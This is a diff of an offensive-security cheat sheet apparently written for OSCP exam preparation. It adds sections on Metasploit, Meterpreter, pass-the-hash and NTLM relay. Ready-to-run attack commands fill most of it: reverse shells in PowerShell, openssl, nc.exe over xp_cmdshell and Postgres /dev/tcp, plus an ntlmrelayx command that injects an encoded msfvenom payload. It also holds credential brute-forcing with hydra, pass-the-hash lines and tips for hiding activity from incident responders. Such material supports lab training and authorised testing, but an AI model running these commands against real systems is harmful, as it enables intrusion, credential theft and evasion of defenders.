@@ -16,7 +16,7 @@ script scanning on those ports.
 
 ```sh
 VICTIM_IP=VICTIM_IP
-sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn --script "default,safe,vuln" -sV -oA tcp-all
+sudo rustscan --ulimit 5000 -a $VICTIM_IP -- -v -n -Pn -sV --script "default,safe,vuln" -oA tcp-all
 ```
 
 ## 2.2 Nmap
@@ -205,7 +205,6 @@ These are checked by default with Nmap.
 - ftp : ftp
 
 
-
 **Bruteforce logins**:
 
 ```sh
@@ -213,7 +212,6 @@ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpass
 hydra -P /usr/share/wordlists/rockyou.txt -l USER ftp://VICTIM_IP
 hydra -V -f -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -l USERNAME ftp://VICTIM_IP
 ```
-
 
 
 **Connecting & Interaction:**
@@ -267,7 +265,6 @@ QUIT # exit
 ```
 
 
-
 **Batch Download (all files)**:
 
 ```sh
@@ -275,7 +272,6 @@ QUIT # exit
 wget -m ftp://anonymous:anonymous@VICTIM_IP
 wget -m --no-passive ftp://anonymous:anonymous@VICTIM_IP
 ```
-
 
 
 **Config Files:**
@@ -387,6 +383,8 @@ Other ideas:
 
 See [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smtp)
 
+
+
 ## 3.4 DNS - 53
 
 **PRO TIP**: Make sure you add the DNS entries you discover to your
@@ -473,6 +471,7 @@ for oct in $(seq 1 254); do host 192.168.69.$oct; done | grep -v "not found"
 ```
 
 
+
 ## 3.5 Finger - 79
 
 If the `finger` service is running, it is possible to enumerate usernames.
@@ -480,6 +479,7 @@ If the `finger` service is running, it is possible to enumerate usernames.
 ```sh
 nmap -vvv -Pn -sC -sV -p79 $VICTIM_IP
 ```
+
 
 
 ## 3.6 HTTP(s) - 80,443
@@ -1058,6 +1058,7 @@ php://input
 # Also try bypassing filters with ....// instead of ../
 ```
 
+
 #### 3.6.5.2 One-liner PHP Webshells
 
 Simple one-liner web shells for when you can drop/modify a php file:
@@ -1322,9 +1323,11 @@ hashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force
 # uses: https://github.com/GhostPack/Rubeus
 Rubeus.exe asreproast /format:john /outfile:hash.txt
 
-# List smb shares using username you just cracked the hash of
-smbclient -L DC_IP -W DOMAIN.tld -U asreproasted-username
+# list SMB shares with hash of asreproasted user
+smbclient '\\VICTIM_IP\sharename' -L DC_IP -W DOMAIN -U username%NTHASH --pw-nt-hash
 ```
+
+
 
 ## 3.8 POP - 110,995
 
@@ -1352,6 +1355,8 @@ RETR 1 # retrieve first email
 # try real (root) and fake users to see if there is a difference in error msgs
 ```
 
+
+
 ## 3.9 RPCbind - 111
 
 Gets you list of ports open using RPC services. Can be used to locate NFS
@@ -1373,6 +1378,8 @@ rpcclient $> queryuser 0xrid_ID
 # see MSRPC (port 135) for more commands
 ```
 
+
+
 ## 3.10 NNTP - 119
 
 Network News Transfer Protocol, allows clients to retrieve (read) and post
@@ -1391,6 +1398,8 @@ QUIT
 # http://www.tcpipguide.com/free/t_NNTPCommands-2.htm
 # https://tools.ietf.org/html/rfc977
 ```
+
+
 
 ## 3.11 MSRPC and NetBIOS - 135,137,139
 
@@ -1455,6 +1464,8 @@ More SIDs
 # can also add creds: [[domain/]username[:password]@]<VictimIP>
 impacket-samrdump -port 139 $VICTIM_IP
 ```
+
+
 
 ## 3.12 SMB - 445
 
@@ -1572,8 +1583,9 @@ smbclient //$VICTIM_IP/SHARENAME
 > mget * # copy all files matching mask to host
 
 # Interactive smb shell with creds
-smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username[%password]
+smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username[%password]
 # add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)
+smbclient '\\VICTIM_IP\sharename' -W DOMAIN -U username%NTHASH --pw-nt-hash
 
 smb:\> help  # displays commands to use
 smb:\> ls  # list files
@@ -1585,6 +1597,8 @@ mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
 # try executing a command using wmi (can try psexec by adding '--mode psexec')
 smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
 ```
+
+
 
 ## 3.13 SNMP(s) - 161,162,10161,10162
 
@@ -1729,9 +1743,13 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp
 
 This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)
 
+
+
 ## 3.14 LDAP(s) - 389,636
 
 TODO
+
+
 
 ## 3.15 MSSQL - 1443
 
@@ -1883,6 +1901,8 @@ xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
 go
 ```
 
+
+
 ## 3.16 NFS - 2049
 
 [HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
@@ -1924,6 +1944,8 @@ sudo usermod -a -G tempgroup tempuser
 ```
 
 See also: [6.7. Using NFS for Privilege Escalation](#67-using-nfs-for-privilege-escalation)
+
+
 
 ## 3.17 MySQL - 3306
 
@@ -2100,10 +2122,9 @@ xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680
 # /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
 
 # using pass-the-hash to connect:
-# replace /p: with /pth:/NTHASH
+# replace /p: with /pth:NTHASH
 xfreerdp /u:Administrator /d:SVCORP /pth:63485d30576a1a741106e3e800053b34 /v:$VICTIM_IP
 ```
-
 
 
 **Bruteforce RDP Credentials:**
@@ -2115,7 +2136,6 @@ hydra -l Administrator -P /usr/share/wordlists/rockyour.txt rdp://VICTIM_IP
 # password spray against list of users
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://VICTIM_IP
 ```
-
 
 
 **Add RDP User**: (good for persistence)
@@ -2137,7 +2157,6 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 ## 3.19 PostgreSQL - 5432
 
 [HackTricks - Pentesting PostgreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
-
 
 **Connect:**
 
@@ -2215,7 +2234,6 @@ DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
 You can put any bash shell command in the string after PROGRAM (e.g. replace `'id'` with `'/bin/bash -c \"bash -i >& /dev/tcp/LISTEN_IP/443 0>&1\"'`.
 
 
-
 Postgres syntax is different from MySQL and MSSQL, and it's stricter about types. This leads to differences when doing SQL injection.
 
 - String concat operator: `||`
@@ -2226,13 +2244,11 @@ Postgres syntax is different from MySQL and MSSQL, and it's stricter about types
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) has great documentation on Postgres injection.
 
 
-
 Interesting Groups/Roles:
 
 - **`pg_execute_server_program`** can **execute** programs
 - **`pg_read_server_files`** can **read** files
 - **`pg_write_server_files`** can **write** files
-
 
 
 
@@ -2253,6 +2269,8 @@ medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
 ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
 patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 ```
+
+
 
 ## 3.21 MongoDB - 27017
 
@@ -2411,6 +2429,8 @@ The format is:
 ```
 arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
 ```
+
+
 
 
 # 4 Exploitation
@@ -2680,50 +2700,7 @@ john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
 
 
 
-## 4.3 Buffer Overflows
-
-I wrote a great python script for tackling the old-school OSCP BOF boxes.
-Check it out [here](tools/pwn-bof-template.py).
-
-For quick-and dirty offset finding, sometimes you can try something like:
-
-```sh
-# using radare2's ragg2 utility for pattern generation:
-ragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT
-# look up offset (note: must be hex value with '0x' at start!):
-ragg2 -q 0x414a4141
-
-# using msf's pattern_create.rb:
-msf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT
-# look up offset (can be either hex value or string)
-msf-pattern_offset -q 2Aa3
-```
-
-In Windows' Immunity Debugger, you can use [mona.py](https://github.com/corelan/mona) for building exploits.
-Here are some useful commands:
-
-```sh
-# To make mona easier to work with, set a custom working folder:
-!mona config -set workingfolder c:\mona
-
-# find the offset of EIP register in your buffer:
-!mona findmsp -distance <PATTERN_SIZE>
-# equivalent to:
-msf-pattern_offset -q EIP_VAL
-
-# Check for bad bytes. First start with baseline pattern that uses all bytes
-# except null:
-!mona bytearray -b "\x00"
-# Then compare your memory at ESP with the baseline:
-!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDR>
-# Finally, add any found bad bytes to the list, repeating the exploit/check
-# until you get "Unmodified" status after running the compare command.
-
-# find 'jmp esp' gadget, excluding bad bytes in the pointer
-!mona jmp -r esp -cpb '\x00\x51'
-```
-
-## 4.4 Reverse Shells
+## 4.3 Reverse Shells
 
 - [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Reverse Shell Generator](https://www.revshells.com/)
@@ -2796,15 +2773,13 @@ Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ..
 $client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-Alternatively, you can create a PowerShell one-liner with msfvenom:
+Alternatively, you can create a PowerShell reverse shell with msfvenom:
 
 ```sh
 msfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=LISTEN_IP
 ```
 
-If you convert to base64 on Linux for execution with
-`powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you
-don't mess up the UTF-16LE encoding that Windows uses:
+If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:
 
 ```sh
 # base64-encoding custom powershell 1-liner
@@ -2817,7 +2792,7 @@ msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=192.168.45
 Also, you can use `powercat.ps1`, a netcat equivalent in PowerShell, with "-e" support.
 
 ```sh
-cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+cp /usr/share/windows-resources/powercat/powercat.ps1 .
 sudo python -m http.server 80
 nc -lvnp 6969
 ```
@@ -2841,6 +2816,7 @@ sudo openssl s_server -accept 443 -key key.pem -cert cert.pem
 # Client-side reverse shell
 rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
 ```
+
 
 **Socat Listener**
 
@@ -2910,6 +2886,8 @@ Getting help:
 ```sh
 # list all available payloads
 msfvenom --list payloads
+# list payloads for specific platform and architecture
+msfvenom -l payloads --platform windows --arch x64
 
 # view payload options
 msfvenom -p PAYLOAD --list-options
@@ -2937,7 +2915,7 @@ For some Windows shellcode (mainly buffer overflow exploits), you might need to 
 
 
 
-### 4.4.1 Running a detached/daemonized process on Linux
+### 4.3.1 Running a detached/daemonized process on Linux
 
 When delivering a payload, sometimes it needs to run as a daemon so it doesn't
 die when the session/connection is closed. Normally you do this with `nohup`,
@@ -2950,7 +2928,7 @@ Still, you can accomplish creating a daemonized process by using sub-shells:
 
 
 
-### 4.4.2 Covering your tracks
+### 4.3.2 Covering your tracks
 
 When you connect via a reverse/bind shell, your commands get saved in the
 terminal history. To avoid logging this (to make incident response team's job
@@ -2973,14 +2951,18 @@ Remove-Module PSReadline
 
 
 
-### 4.4.3 Upgrading to Interactive Shell
+### 4.3.3 Upgrading to Interactive Shell
 
 Use this if you have a netcat-based reverse shell coming from a Linux box.
 
 ```sh
 ###  In reverse shell  ##########
+# you might need to fix your PATH first
+export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
+
+# start pty using python
 python3 'import pty; pty.spawn("/bin/bash")'
-# windows
+# windows equivalent
 c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'
 
 # Ctrl-Z, jumps you back to local shell by backgrounding reverse shell
@@ -2999,10 +2981,292 @@ export TERM=xterm-256color
 # reload bash to apply TERM env var
 exec /bin/bash
 
-export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
 ```
 
 
+## 4.4 Metasploit
+
+The Metasploit framework is only allowed to be used on one box on the OSCP exam, but it has great tools to make exploitation and post-exploit interaction easier.
+
+Initializing Metasploit (first time running it):
+
+```sh
+# initialize the metasploit postgres database
+sudo msfdb init
+
+# enable postgres to start on boot
+sudo systemctl enable postgresql
+```
+
+After the database starts, you can use any of the following commands to manage the database:
+
+- `msfdb reinit` - Deletes and reinitializes the database.
+- `msfdb delete` - Deletes the database.
+- `msfdb start` - Starts the database.
+- `msfdb stop` - Stops the database.
+- `msfdb status` - Shows the database status.
+
+### 4.4.1 Interacting with Metasploit via `msfconsole`
+
+Most common `msfconsole` commands:
+
+```sh
+# get list of commands or detailed help
+help [COMMAND]
+# find module you want
+search KEYWORDS...
+# activate the module
+use NUM
+# get detailed info about active module
+info
+# view module options
+show options
+# set module options
+set OPTION VALUE
+# execute the module
+run
+```
+
+Detailed interaction reference:
+
+```sh
+# start the console
+# optional args:
+# -q : don't display animations, banner, and version on start
+# -x '<COMMANDS>' : commands to run on start (quote the entire command string).
+#                   Multiple commands separated by semicolon.
+# -r FILE : load resource script (.rc) file and run those commands at start
+#           (see section on resource scripts)
+msfconsole
+
+
+# inside the msfconsole:
+
+# check the database status
+msf6> db_status
+# check what workspace you're using
+# workspaces help isolate data from different assessments/subnets
+# (the database saves everything)
+msf6> workspace
+# add a workspace
+msf6> workspace -a NAME
+# change workspaces
+msf6> workspace OTHERNAME
+# delete workspace
+msf6> workspace -d NAME
+
+
+# working with modules:
+
+# search for module containing specific keywords
+msf6> search Apache 2.4.49
+# restrict search to exploits
+msf6> search type:exploit smb
+# restrict search to auxiliary modules (scanners, brute-forcers, etc.)
+msf6> search type:auxiliary smb
+# view description, reliability, etc. info of a module
+# if you want to view info on active module, omit arg
+msf6> info [module-name-or-search-number]
+# Choose a module to activate
+msf6> use 56
+# view arguments/options to set for active module
+# at a minimum, RHOSTS is usually a required arg
+msf6 auxiliary(scanner/smb/smb_version) > show options
+# set value for option (option name not case-sensitive)
+msf6 auxiliary(scanner/smb/smb_version) > set rhosts VICTIM_IP
+# unset an option
+msf6 auxiliary(scanner/smb/smb_version) > unset rhosts
+# set RHOSTS based on discovered hosts/services in database
+msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
+# set (global) option to persist accross all modules
+msf6 auxiliary(scanner/smb/smb_version) > setg rhosts VICTIM_IP
+# unset a global option
+msf6 auxiliary(scanner/smb/smb_version) > unsetg rhosts
+# show advanced options for the module
+msf6 auxiliary(scanner/smb/smb_version) > show advanced
+# execute the active module (once required options set)
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+# when working with exploits
+
+# show list of all compatible payloads for active exploit module
+msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
+# chose payload to use (can use number from 'show payloads')
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload NUM_OR_NAME
+# set payload options same way as exploit module options
+# (you can specify an interface name, and it'll auto-pull your IP)
+msf6 exploit(multi/http/apache_normalize_path_rce) > set lhost tun0
+
+
+# using data stored in the database:
+
+# run nmap scan and save results to msfdb workspace
+msf6> db_nmap <nmap-options>
+# list all discovered hosts in msfdb workspace
+msf6> hosts
+# NOTE: you an tag hosts and search by tags.
+# see: https://docs.rapid7.com/metasploit/tagging-hosts-in-msfconsole
+# list all discovered services
+msf6> services
+# list all discovered services for port 8000
+msf6> services -p 8000
+# check if metasploit automatically detected any vulnerabilities
+msf6> vulns
+# view any saved/discovered credentials from brute force scans
+msf6> creds
+
+
+# meterpreter sessions and routing tables:
+
+# view list of sessions
+msf6> sessions
+# resume interaction on backgrounded session
+msf6> sessions -i SESS_ID
+# add route to metasploit's routing table for attacking internal targets
+# this lets you do things like run port scans or throw exploits against
+# internal hosts from inside metasploit
+msf6> route add CIDR_INTERNAL_SUBNET SESSION_ID
+# view existing msf routing table
+msf6> route print
+# clear all routes from table
+msf6> route flush
+```
+
+
+
+### 4.4.2 Metasploit Resource Scripts
+
+When starting `msfconsole` with the `-r` flag, you pass it a "resources" script (`.rc`) file that contains a series of instructions to run as soon as metasploit starts.
+
+**NOTE:** There are lots of pre-made resource scripts located here:
+
+```sh
+ls -l /usr/share/metasploit-framework/scripts/resource
+```
+
+Here is an example file. The script looks exactly like a series of commands you'd type in the interactive console.
+
+```sh
+use exploit/multi/handler
+set payload windows/meterpreter_reverse_https
+set lhost LHOST
+set lport 443
+# cause the spawned Meterpreter to automatically launch a background notepad.exe
+# process and migrate to it. Automating process migration helps to avoid 
+# situations where our payload is killed prematurely either by defensive 
+# mechanisms or the termination of the related process
+set AutoRunScript post/windows/manage/migrate
+# ensure that the listener keeps accepting new connections after a session is created
+set ExitOnSession false
+# run module as a job in the background and stop us from automatically interacting with the session
+run -z -j
+```
+
+
+### 4.4.3 Meterpreter command basics
+
+One payload option is to use the Meterpreter agent. It drops you into a command shell that lets you do all sorts of fun stuff easily (port forwarding, key-logging, screen grabbing, etc.).
+
+```sh
+# view list of meterpreter commands
+meterpreter> help
+# get information about victim system
+meterpreter> sysinfo
+# get username
+meterpreter> getuid
+# drop into interactive bash/cmd.exe shell
+meterpreter> shell
+# to suspend the shell to background, use Ctrl+z
+# list backgrounded shells (called 'channels'):
+meterpreter> channel -l
+# interact with backgrounded channel (shell)
+meterpreter> channel -i NUM
+# download file from victim
+meterpreter> download /etc/passwd
+# upload file to victim
+meterpreter> upload /usr/bin/unix-privesc-check /tmp/
+# attempt to auto-privesc to SYSTEM (on Windows host)
+meterpreter> getsystem
+# migrate your process to the memory of another process
+meterpreter> ps # find another process running with same user as you
+meterpreter> migrate PID # move your process to the memory of another process
+# spawn a process hidden ('-H') from user (no window)
+meterpreter> execute -H -f iexplore.exe
+# use mimikatz functionality to grab credentials
+meterpreter> load kiwi
+meterpreter> creds_all
+# add local port forward rule via meterpreter
+meterpreter> portfwd add -l LPORT -p RPORT -r RHOST
+# send this meterpreter session to background (return to msf console)
+meterpreter> bg
+# shut down meterpreter agent
+meterpreter> exit
+```
+
+
+### 4.4.4 Metasploit Modules and Payloads
+
+Metasploit modules are located in:
+
+```
+/usr/share/metasploit-framework/modules/
+```
+
+These are the types/categories of Metasploit modules:
+
+- **Exploit** - Exploits a vulnerability in a system/service, injecting your shellcode/command payload.
+- **Auxiliary** - Does not execute a payload, but can be used to perform arbitrary actions that may not be directly related to exploitation. Examples of auxiliary modules include scanners, fuzzers, and denial of service attacks.
+- **Post-Exploitation** - Enables you to gather more information or to gain further access to an exploited target system. E.g. hash dumps and service enumerators.
+- **Payload** - A payload is the shell code that runs after an exploit successfully compromises a system. Defines what you want to do to the target system after you take control of it (e.g. Meterpreter, TCP reverse shell, run shell command).
+- **NOP generator** - A NOP generator produces a series of random bytes that you can use to bypass standard IDS and IPS NOP sled signatures. Use NOP generators to pad buffers.
+
+Metasploit **payloads** are either *single* (non-staged) or *staged*:
+- *Single* payloads are entirely self-contained, fire-and-forget, and typically have a larger size, but they are more stable. They have extra **underscores** in their name (`linux/shell_reverse_tcp`).
+- *Staged* payloads are basically a dropper that fetches and executes the rest after a callback. They are smaller in size, but can be less stable, and they require a metasploit handler to be listening to serve up the rest of the payload. They use extra **slashes** in their name (`linux/shell/reverse_tcp`).
+
+
+## 4.5 Buffer Overflows
+
+I wrote a great python script for tackling the old-school OSCP BOF boxes.
+Check it out [here](tools/pwn-bof-template.py).
+
+For quick-and dirty offset finding, sometimes you can try something like:
+
+```sh
+# using radare2's ragg2 utility for pattern generation:
+ragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT
+# look up offset (note: must be hex value with '0x' at start!):
+ragg2 -q 0x414a4141
+
+# using msf's pattern_create.rb:
+msf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT
+# look up offset (can be either hex value or string)
+msf-pattern_offset -q 2Aa3
+```
+
+In Windows' Immunity Debugger, you can use [mona.py](https://github.com/corelan/mona) for building exploits.
+Here are some useful commands:
+
+```sh
+# To make mona easier to work with, set a custom working folder:
+!mona config -set workingfolder c:\mona
+
+# find the offset of EIP register in your buffer:
+!mona findmsp -distance <PATTERN_SIZE>
+# equivalent to:
+msf-pattern_offset -q EIP_VAL
+
+# Check for bad bytes. First start with baseline pattern that uses all bytes
+# except null:
+!mona bytearray -b "\x00"
+# Then compare your memory at ESP with the baseline:
+!mona compare -f C:\mona\bytearray.bin -a <ESP_ADDR>
+# Finally, add any found bad bytes to the list, repeating the exploit/check
+# until you get "Unmodified" status after running the compare command.
+
+# find 'jmp esp' gadget, excluding bad bytes in the pointer
+!mona jmp -r esp -cpb '\x00\x51'
+```
 
 # 5 Windows
 
@@ -3032,12 +3296,11 @@ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seat
 # for older machines
 wget https://github.com/carlospolop/winPE/raw/master/binaries/accesschk-xp/accesschk-2003-xp.exe
 
-# start web server
-sudo python -m http.server 80
+# start SMB server
+impacket-smbserver -smb2support -user derp -password herpderp share .
 
 # on windows host:
-powershell -c "iwr -uri http://LISTEN_IP/winPEASx64.exe -Outfile winpeas.exe"
-.\winpeas.exe
+\\ATTACKER_IP\share\winpeas.exe
 ```
 
 Commands to run:
@@ -3050,6 +3313,10 @@ hostname
 # Who am I?
 whoami /all
 echo %username%
+
+# powershell way to check Integrity Level of another process
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
 
 # What users/localgroups are on the machine?
 net user
@@ -3142,22 +3409,21 @@ Get-WinEvent Microsoft-Windows-PowerShell/Operational | Where-Object Id -eq 4104
 # User files that may have juicy data
 powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.gpg,*.kdbx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
 
-# What Active Directory Domain you belong to
-wmic computersystem get domain
-systeminfo | findstr /B /C:"Domain"
+# Check if plaintext creds stored by Wdigest (key exists, not set to 0)
+# typically only common in Windows 7 and earlier
+reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
 
-# Which Domain Controller you're authenticated to (logonserver)
-set l
-nltest /dsgetdc:DOMAIN.TLD
+# LSA Protection enabled (key set to 1)?
+reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
 
-# View Domain Users
-net user /domain
-# View Domain Groups
-net group /domain
-
-# View Members of Domain Group
-net group /domain "Domain Administrators"
-net group /domain "Domain Admins"
+# Credential Guard enabled (key set to 1 or 2)
+reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
+# win11 automatic virtualization based security enabled:
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 /v IsolatedCredentialsRootSecret
+# virualization based security enabled:
+reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
+# secure boot enabled:
+reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v RequirePlatformSecurityFeatures
 
 # List saved credentials
 cmdkey /list
@@ -3167,6 +3433,9 @@ cmdkey /list
 
 # Run executable with saved creds (assuming listed in cmdkey output)
 runas /savecred /user:admin C:\Users\Public\revshell.exe
+
+# check account policy (lockout threshold)
+net accounts
 
 # If both registry keys are set with DWORD values of 1, low-priv users can install *.msi files as NT AUTHORITY\SYSTEM
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -3238,14 +3507,13 @@ Automated checks using SharpUp.exe or PowerUp.ps1:
 # on kali get SharpUp and/or PowerUp, serve on http
 wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
 cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
-sudo python -m http.server 80
+impacket-smbserver -smb2support -user derp -password herpderp share .
 
 # on victim
-iwr http://LISTEN_IP/PowerUp.ps1 -outfile PowerUp.ps1
-.\SharpUp.exe audit
+\\ATTACKER_IP\share\SharpUp.exe audit
 # or
 powershell -ep bypass
-. .\PowerUp.ps1
+. \\ATTACKER_IP\share\PowerUp.ps1
 Invoke-PrivescAudit
 
 # PowerUp, individually:
@@ -3619,6 +3887,13 @@ Find-PathDLLHijack
 
 To manually see if a binary is missing DLLs, you can use Process Monitor (procmon, from [Sysinternals](https://download.sysinternals.com/files/SysinternalsSuite.zip)). This requires admin privileges, so you may need to copy over the service binary and DLLs to your own Windows machine to test. It's also possible to perform static binary reverse engineering, but that's a pain.
 
+```sh
+wget https://download.sysinternals.com/files/SysinternalsSuite.zip
+unzip -d sysinternals SysinternalsSuite.zip
+impacket-smbserver -smb2support -user derp -password herpderp share .
+# connect with: net use \\ATTACKER_IP herpderp /user:derp
+```
+
 Add Filters to procmon to only see missing DLL events. This happens when `CreateFile()` results in a `NAME NOT FOUND` error while trying to open a DLL. 
 
 | Column       | Relation  | Value           | Action  |
@@ -3817,7 +4092,7 @@ wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotat
 unzip RoguePotato.zip
 
 # set up socat redirector for roguepotato to bounce off of
-sudo socat -ddd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
+sudo socat -dd tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
 # also start another netcat listener to catch the system shell
 sudo nc -vlnp 443
 ```
@@ -3835,6 +4110,53 @@ iwr -uri http://LISTEN_IP/RoguePotato.exe -Outfile RoguePotato.exe
 ./RoguePotato.exe -l 9999 -e "C:\Users\Public\revshell.exe" -r LISTEN_IP
 # and bingo! you should have system on the listener you set up!
 ```
+
+### 5.2.7 Windows Pass-The-Hash Attacks
+
+There are lots of ways to pass the hash on windows, giving you access as a user
+with just the hash of their creds.
+
+See [Grabbing Hashes from Windows](#5.10.5%20Grabbing%20Hashes%20from%20Windows) for techniques on grabbing Windows password hashes.
+
+Note: Windows NTLM hashes are in the form LMHASH:NTHASH. That convention is used here.
+
+```sh
+# Get remote powershell shell by passing the hash
+# install: sudo apt install evil-winrm
+evil-winrm -i $VICTIM_IP -u username -H NTHASH
+
+# Run remote command as SYSTEM (note colon before NT hash)
+impacket-psexec -hashes :NTHASH [DOMAIN/]administrator@$VICTIM_IP [whoami]
+# omit the command to get interactive shell
+
+# Run remote command as Administrator; same syntax as psexec
+impacket-wmiexec -hashes :NTHASH [DOMAIN/]Administrator@$VICTIM_IP
+
+# execute remote command as Admin (IP MUST GO LAST!)
+crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP
+
+# spawn cmd.exe shell on remote windows box
+# replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
+pth-winexe -U 'admin%hash' //WINBOX_IP cmd.exe
+
+# other options for PtH: xfreerdp, smbclient
+```
+
+
+### 5.2.8 Windows NTLMv2 Hash Relay Attack
+
+When you can't crack an NTLMv2 hash that you were able to capture with Responder, you can relay it to another machine for access/RCE (assuming it's an admin hash, and Remote UAC restrictions are disabled on the target). If this works, you get instant SYSTEM on the remote machine.
+
+```sh
+# '-c' flag is command to run
+# here we are generating a powershell reverse shell one-liner
+# as base64-encoded command
+sudo impacket-ntlmrelayx -t VICTIM_IP -no-http-server -smb2support -c "powershell -enc $(msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=LISTEN_IP | iconv -t UTF-16LE | base64 | tr -d '\n')"
+
+# start a netcat listener to catch the reverse shell
+sudo nc -nvlp 443
+```
+
 
 ## 5.3 Antivirus & Firewall Evasion
 
@@ -4185,108 +4507,17 @@ Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
 
 
-## 5.4 Lateral Movement in Windows Active Directory
-
-
-
-### 5.4.1 Quick Active Directory Enumeration
-
-This script will provide a quick listing of all computers, users, service
-accounts, groups and memberships on an Active Directory domain.
-
-This script was written by Cones, modifying the example code provided in the
-PWK course materials.
-
-```powershell
-$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();
-$q=("LDAP://"+($d.PdcRoleOwner).Name+"/DC="+($d.Name.Replace('.',',DC=')));
-$s=New-Object System.DirectoryServices.DirectorySearcher([ADSI]$q);
-$s.SearchRoot=(New-Object System.DirectoryServices.DirectoryEntry);
-write-host "-- COMPUTERS --";
-$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
-write-host "-- USERS --";
-$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
-write-host "-- SERVICES --";
-$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
-write-host "-- GROUPS --";
-$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
